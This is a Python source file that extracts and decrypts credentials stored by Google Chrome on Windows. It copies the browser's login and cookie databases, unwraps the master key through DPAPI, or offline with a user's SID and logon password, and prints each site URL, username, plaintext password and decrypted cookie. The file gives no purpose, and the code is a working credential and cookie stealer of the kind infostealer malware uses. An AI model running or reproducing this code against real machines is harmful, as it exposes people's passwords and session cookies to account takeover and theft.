import base64
import getpass
import json
import os
import shutil
import sqlite3
import binascii
from datetime import datetime, timedelta
import win32crypt
from Cryptodome.Cipher import AES

import DecryptCredentials
import FileFormat
import MasterKey

tmp_dir = './chrome_cache/'


def GetSqlFile(file_path: str):
    if not os.path.exists(tmp_dir):
        os.mkdir(tmp_dir)
    file_name = file_path.split('/')[-1]
    file_db = os.path.join(tmp_dir, file_name)
    if not os.path.exists(file_db):
        shutil.copy(file_path, file_db)
    assert os.path.exists(file_db), "database file copy failed!"

    db = sqlite3.connect(file_db)
    cursor = db.cursor()
    sql_table = []
    try:
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for r in cursor.fetchall():
            if len(r) == 3:
                url = r[0]
                user_name = r[1]
                enc_psw = r[2]
                sql_table.append((url, user_name, enc_psw))
            else:
                continue
    except Exception as ex:
        print(ex)
    return sql_table


def GetEncMasterFromFile(file_path: str):
    with open(file_path, 'r', encoding='utf-8') as f:
        content = f.read()
        j_content = json.loads(content)

    master_key = base64.b64decode(j_content['os_crypt']['encrypted_key'])
    assert master_key[:5] == b'DPAPI', "bad master key"
    master_key = master_key[5:]
    return master_key


def GetLocalMasterKey(file_path: str):
    if not os.path.exists(tmp_dir):
        os.mkdir(tmp_dir)
    file_name = file_path.split('/')[-1]
    masterkey_file = os.path.join(tmp_dir, file_name)
    if not os.path.exists(masterkey_file):
        shutil.copy(file_path, masterkey_file)
    assert os.path.exists(masterkey_file), "master key file copy failed!"
    master_key = GetEncMasterFromFile(masterkey_file)

    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    # print('master key', master_key)
    return master_key


def GetOfflineMasterKey(raw_masterKey: bytes, key_path: str, sid: str, logon_password: str):
    blob = FileFormat.DPAPI_BLOB()
    blob = DecryptCredentials.HandleBlob(blob, raw_masterKey)
    guid = blob._guidMasterKey
    dpdpi_master_key = MasterKey.HandleRawMasterkey(key_path)
    assert guid == dpdpi_master_key.szGuid
    masterKey, flag = MasterKey.DecryptMasterKey(dpdpi_master_key, logon_password, sid)
    assert flag, "Fail to decrypt master key!"
    output = DecryptCredentials.DecryptCrenFile(blob, masterKey)
    padding = output[-2::]
    padding = int(padding, 16)
    return output[:-padding * 2]


def AES_GCM_256(key: bytes, msg: bytes, IV: bytes):
    cipher = AES.new(key, AES.MODE_GCM, IV)
    plain_text = cipher.decrypt(msg)
    return plain_text


def DecryptPassword(password: bytes, master_key: bytes, masterKey_path: str = None,
                    sid: str = None, logon_psw: str = None):
    logo = password[0:3]
    if logo != b'v10':
        logo = password[:4]
        if logo == b'\x01\x00\x00\x00':
            if not (masterKey_path and sid and logon_psw):
                msg = win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                return msg
            else:
                msg = GetOfflineMasterKey(password, masterKey_path, sid, logon_psw)
                return binascii.a2b_hex(msg).hex()
        else:
            return '(error psw)'
    IV = password[3:15]
    payload = password[15:]
    plain_text = AES_GCM_256(master_key, payload, IV)
    try:
        plain_text = plain_text[:-16].decode()
    except UnicodeDecodeError:
        plain_text = plain_text[:-16]
    return plain_text


def TryToGetDataBase():
    username = getpass.getuser()
    sql_path = f'C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Login Data'
    key_path = f'C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Local State'
    if os.path.exists(sql_path):
        return sql_path, key_path
    else:
        print('Getting Chrome Database failed!')
        return None, None


def GetPasswordByChromeAuto():
    print('Chrome Browser')
    ClearCache()
    sql_path, key_path = TryToGetDataBase()
    if sql_path:
        dbs = GetSqlFile(sql_path)
        count = 0
        if key_path:
            master_key = GetLocalMasterKey(key_path)
            for db in dbs:
                if db[0] and db[1] and db[2]:
                    print(count, db[0], db[1], DecryptPassword(db[2], master_key))
                    count += 1
                else:
                    continue
        else:
            for db in dbs:
                print(count, db)
                count += 1
    else:
        return


def GetPasswordByChromeOffline(sql_path: str, mk_path: str, logon_psw: str, sid: str, key_path: str):
    raw_master_key = GetEncMasterFromFile(mk_path)
    master_key = GetOfflineMasterKey(raw_master_key, key_path, sid, logon_psw)
    dbs = GetSqlFile(sql_path)
    assert master_key, 'get master key failed!'
    assert dbs, 'get dbs failed!'

    count = 0
    for db in dbs:
        if db[0] and db[1] and db[2]:
            print(count, db[0], db[1], DecryptPassword(db[2], bytes.fromhex(master_key),
                                                       key_path, sid, logon_psw))
            count += 1
        else:
            continue


def GetLocalCookies(sql_path: str = None):
    username = getpass.getuser()
    if not sql_path:
        sql_path = f'C:/Users/{username}/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies'
        print('No input Cookies file, Search Auto')
    if not os.path.exists(sql_path):
        print('Cookies file not exist')
        return None
    else:
        if not os.path.exists(tmp_dir):
            os.mkdir(tmp_dir)
        file_name = sql_path.split('/')[-1]
        cookie_file = os.path.join(tmp_dir, file_name)
        if not os.path.exists(cookie_file):
            shutil.copy(sql_path, cookie_file)
        assert os.path.exists(cookie_file)

        cookies_db = sqlite3.connect(cookie_file)
        cursor = cookies_db.cursor()
        _, key_path = TryToGetDataBase()
        master_key = GetLocalMasterKey(key_path)

        assert master_key, 'get master key failed!'

        try:
            cursor.execute('SELECT host_key,encrypted_value,expires_utc FROM cookies')
            for r in cursor.fetchall():
                cookie = r[1]
                if cookie[:3] == b'v10':
                    IV = cookie[3:15]
                    payload = cookie[15:]
                    plain_text = AES_GCM_256(master_key, payload, IV)
                    try:
                        plain_text = plain_text[:-16].decode()
                    except UnicodeDecodeError:
                        plain_text = plain_text[:-16]
                    print(r[0], plain_text, GetWindowsTimeStamp(r[2]))
                else:
                    continue

        except Exception as ex:
            print(ex)


def GetWindowsTimeStamp(time_stamp: int):
    try:
        date = datetime(1601, 1, 1) + timedelta(microseconds=time_stamp)
    except OverflowError:
        print('date convert overflow!')
        return 'None'
    return str(date)


def ClearCache():
    if os.path.exists(tmp_dir):
        shutil.rmtree(tmp_dir)
    if not os.path.exists(tmp_dir):
        os.mkdir(tmp_dir)

